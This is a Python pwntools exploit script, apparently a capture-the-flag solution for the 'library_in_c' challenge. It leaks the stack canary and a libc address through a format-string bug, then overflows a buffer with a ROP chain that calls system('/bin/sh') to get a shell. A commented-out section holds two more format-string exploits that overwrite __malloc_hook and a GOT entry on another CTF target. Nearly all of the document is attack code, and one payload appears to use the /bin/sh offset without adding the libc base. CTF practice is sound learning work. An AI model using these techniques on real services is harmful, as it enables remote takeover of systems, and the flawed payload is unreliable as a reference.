#RazviOverflow
# https://security.stackexchange.com/questions/178006/how-to-leak-libc-base-address-using-format-string-exploit?rq=1

# Step 1 -> leak canary and offset of __libc_start_main_offset (first gets)
# Step 2 -> overwrite  main return address to pop rdi;(address of the /bin/sh)ret; address to system() (second gets)

from pwn import *

binary = ELF("library_in_c")
libc = ELF("libc.so.6")
executable = remote("shell.actf.co", 20201)

libc_start_main_offset = libc.symbols['__libc_start_main']
libc_bin_sh_offset = libc.search('/bin/sh')
libc_system_offset = libc.symbols['system']

#for address in libc_bin_sh_offset:
	#print hex(address)

libc_bin_sh_offset = 0x18cd57 #offset of /bin/sh

# %25$016lX.%27$016lX
# %25$016lX -> canary
# %27$016lX -> main @ret address
print executable.recvuntil("name?")
executable.sendline("%25$016lX.%27$016lX")
text = executable.recvuntil("out?")
print text
# Program's output
# What is your name?
#
# Why hello there 41F85B3B74383E00.00007FA9D8BF6830
# And what book would you like to check out?
canary_libcaddr = text.split("\n")[1].split(" ")[-1].split(".")
canary = int(canary_libcaddr[0], 16)
libc_base_address = int(canary_libcaddr[1], 16) - int(libc_start_main_offset)
system_address = libc_base_address + libc_system_offset

#Used ropgadget to get offsets
# 0x0000000000067497 : add cl, ch ; pop rdi ; ret 0xffff
gadget_address = libc_base_address + 0x67497

padding = "A" * 0x40 # buffer
padding2 = "B" * 0x8 # saved rbp

payload = padding + p64(canary) + padding2 + p64(gadget_address) + p64(libc_bin_sh_offset) + p64(system_address)

executable.sendline(payload)
print executable.recvall()


# print "BINARY: "
# print "Symbols: " 
# print str(binary.symbols['puts']) 
# print "GOT: " 
# print str(binary.got['puts'])
# print "PLT: " 
# print str(binary.plt['puts'])
# #print "Address: " + str(binary.address)
# 
# print "\nLIBC: "
# print "Symbols: " 
# print str(libc.symbols['puts'])
# print "Main: "
# print str(hex(libc.symbols['__libc_start_main']))


'''
from pwn import *

e = ELF('./pwnable')
#p = process('./pwnable')
p = remote('binary.utctf.live', 9003)
libc = ELF('./libc-2.23_1.so')
context.arch='amd64'
s = True
def send(payload):
    p.recvuntil('?\n')
    p.sendline(payload)
    print payload
    if s:
        return p.recvuntil(' is not',drop=True)

libc.address = u64(send('%7$s||||'+p64(e.got['puts'])).ljust(8,'\x00')[:6].ljust(8,'\x00'))-libc.symbols['puts']
print hex(libc.address)
s=False
one_gadget = libc.address+0xf02a4

for i in range(6):
    send('%{}c%8$hhn'.format(one_gadget&0xff).ljust(16,'|')+p64(libc.symbols['__malloc_hook']+i))
    one_gadget >>= 8

send('%100000c')
p.interactive()
______________________________________________
from pwn import *

r = remote("binary.utctf.live",9003)

r.recvuntil("do?\n")

p = b"%7$s    "
p += p64(0x601018) #puts got

r.sendline(p)
puts = u64(r.recvline().split()[0].ljust(8,b'\x00'))
libc = puts-0x6f690
print("libc: "+hex(libc))
system = libc+0x45390
towrite = system%0x100000000
print(hex(towrite))

wl = []
wl.append([towrite%0x10000, 0x601020])
wl.append([towrite//0x10000, 0x601022])

#swap = lambda a,b: b,a

if wl[0][0]>wl[1][0]:
    wl[0],wl[1] = wl[1],wl[0]
print(wl)

p = (b"%%%dc%%10$hn%%%dc%%11$hn" % (wl[0][0],wl[1][0]-wl[0][0])).ljust(32,b' ')
p += p64(wl[0][1])+p64(wl[1][1])
print(p)
print(len(p))
r.sendlineafter("do?\n",p)

r.interactive()

'''

#Symbols: {'': 6295648, u'register_tm_clones': 4196048, u'_IO_stdin_used': 4196624, u'stdout': 6295648, u'plt.fgets': 4195888, u'got.stdout': 6295648, u'_init': 4195776, u'completed.7697': 6295672, u'got.__libc_start_main': 6295536, u'plt.printf': 4195872, u'__libc_start_main': 6295536, u'__dso_handle': 6295640, u'_edata': 6295648, u'printf': 4195872, u'fgets': 4195888, u'_start': 4195936, u'__init_array_end': 6295064, u'_fini': 4196612, u'got.printf': 6295600, u'__FRAME_END__': 4197212, u'puts': 4195820, u'plt.setresgid': 4195856, u'_dl_relocate_static_pie': 4195984, u'got.puts': 6295576, u'_end': 6295680, u'__libc_csu_init': 4196496, u'plt.setvbuf': 4195920, u'main': 4196167, u'got.fgets': 6295608, u'__GNU_EH_FRAME_HDR': 4196900, u'_DYNAMIC': 6295072, u'setresgid': 4195856, u'__libc_csu_fini': 4196608, u'got.setresgid': 6295592, u'frame_dummy': 4196160, u'plt.puts': 4195820, u'deregister_tm_clones': 4196000, u'got.getegid': 6295616, u'__gmon_start__': 6295544, u'stdout@@GLIBC_2.2.5': 6295648, u'stdin@@GLIBC_2.2.5': 6295664, u'__do_global_dtors_aux_fini_array_entry': 6295064, u'__frame_dummy_init_array_entry': 6295056, u'got.stdin': 6295664, u'got.__stack_chk_fail': 6295584, u'stdin': 6295664, u'__do_global_dtors_aux': 4196112, u'got.__gmon_start__': 6295544, u'__stack_chk_fail': 4195840, u'data_start': 6295632, u'__TMC_END__': 6295648, u'got.setvbuf': 6295624, u'plt.getegid': 4195904, u'plt.__stack_chk_fail': 4195840, u'getegid': 4195904, u'__data_start': 6295632, u'__bss_start': 6295648, u'__init_array_start': 6295056, u'setvbuf': 4195920, u'_GLOBAL_OFFSET_TABLE_': 6295552}
#GOT: {u'setresgid': 6295592, u'__gmon_start__': 6295544, u'puts': 6295576, u'stdout': 6295648, u'stdin': 6295664, u'__stack_chk_fail': 6295584, u'__libc_start_main': 6295536, u'printf': 6295600, u'fgets': 6295608, u'getegid': 6295616, u'setvbuf': 6295624}
#PLT: {u'puts': 4195820, u'setresgid': 4195856, u'__stack_chk_fail': 4195840, u'getegid': 4195904, u'printf': 4195872, u'fgets': 4195888, u'setvbuf': 4195920}

